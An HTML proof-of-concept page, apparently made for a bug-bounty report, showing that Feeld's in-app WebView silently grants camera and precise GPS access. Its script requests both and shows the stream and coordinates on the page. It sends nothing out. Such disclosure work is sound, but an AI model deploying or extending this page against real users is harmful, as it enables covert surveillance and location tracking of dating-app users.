<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PoC – Camera &amp; GPS Auto-Grant</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui,sans-serif;background:#111;color:#eee;padding:20px;max-width:480px;margin:auto}
h1{font-size:1.1rem;margin-bottom:12px;color:#ff6b6b}
.card{background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:16px;margin-bottom:12px}
.card h2{font-size:.9rem;color:#aaa;margin-bottom:8px}
.status{font-size:.85rem;padding:6px 10px;border-radius:4px;margin-bottom:8px}
.ok{background:#1a3a1a;color:#4caf50;border:1px solid #2e7d32}
.fail{background:#3a1a1a;color:#ef5350;border:1px solid #c62828}
.wait{background:#3a3a1a;color:#ffc107;border:1px solid #f9a825}
video{width:100%;border-radius:6px;background:#000;margin-top:8px}
#log{font-family:monospace;font-size:.75rem;color:#888;white-space:pre-wrap;margin-top:12px;max-height:200px;overflow-y:auto}
</style>
</head>
<body>
<h1>PoC: WebView Camera &amp; GPS Auto-Grant</h1>
<p style="font-size:.8rem;color:#777;margin-bottom:16px">
This page requests camera and geolocation to demonstrate silent auto-grant
inside Feeld's in-app WebView (HackerOne #3981220).
</p>

<div class="card">
<h2>Camera (getUserMedia)</h2>
<div id="cam-status" class="status wait">⏳ Requesting…</div>
<video id="cam" autoplay playsinline muted></video>
</div>

<div class="card">
<h2>Geolocation (getCurrentPosition)</h2>
<div id="geo-status" class="status wait">⏳ Requesting…</div>
<div id="geo-data" style="font-family:monospace;font-size:.85rem;margin-top:6px"></div>
</div>

<div id="log"></div>

<script>
var log = document.getElementById('log');
function L(m){ log.textContent += new Date().toISOString().slice(11,19) + ' ' + m + '\n'; }

L('Page loaded, origin: ' + location.origin);
L('User-Agent: ' + navigator.userAgent.slice(0,80));

// Camera
(function(){
  var el = document.getElementById('cam-status');
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    el.className = 'status fail';
    el.textContent = '❌ getUserMedia not available';
    L('Camera: API not available');
    return;
  }
  L('Camera: calling getUserMedia({video:true})…');
  navigator.mediaDevices.getUserMedia({video: true}).then(function(stream){
    el.className = 'status ok';
    var t = stream.getVideoTracks()[0];
    var s = t.getSettings();
    el.textContent = '✅ GRANTED – ' + (s.width||'?') + 'x' + (s.height||'?') + ' ' + (t.label||'');
    document.getElementById('cam').srcObject = stream;
    L('Camera: GRANTED – ' + t.label + ' ' + (s.width||'?') + 'x' + (s.height||'?'));
  }).catch(function(e){
    el.className = 'status fail';
    el.textContent = '❌ ' + e.name + ': ' + e.message;
    L('Camera: DENIED/ERROR – ' + e.name + ': ' + e.message);
  });
})();

// Geolocation
(function(){
  var el = document.getElementById('geo-status');
  var data = document.getElementById('geo-data');
  if (!navigator.geolocation) {
    el.className = 'status fail';
    el.textContent = '❌ Geolocation API not available';
    L('Geo: API not available');
    return;
  }
  L('Geo: calling getCurrentPosition()…');
  navigator.geolocation.getCurrentPosition(function(pos){
    el.className = 'status ok';
    el.textContent = '✅ GRANTED – precise location obtained';
    data.innerHTML =
      'Latitude: <b>' + pos.coords.latitude.toFixed(6) + '</b><br>' +
      'Longitude: <b>' + pos.coords.longitude.toFixed(6) + '</b><br>' +
      'Accuracy: <b>' + (pos.coords.accuracy ? pos.coords.accuracy.toFixed(0) + 'm' : 'N/A') + '</b><br>' +
      'Timestamp: ' + new Date(pos.timestamp).toISOString();
    L('Geo: GRANTED – ' + pos.coords.latitude.toFixed(6) + ',' + pos.coords.longitude.toFixed(6) + ' ±' + (pos.coords.accuracy||'?') + 'm');
  }, function(e){
    el.className = 'status fail';
    el.textContent = '❌ ' + e.message;
    L('Geo: DENIED/ERROR – code=' + e.code + ' ' + e.message);
  }, {enableHighAccuracy: true, timeout: 15000});
})();
</script>
</body>
</html>
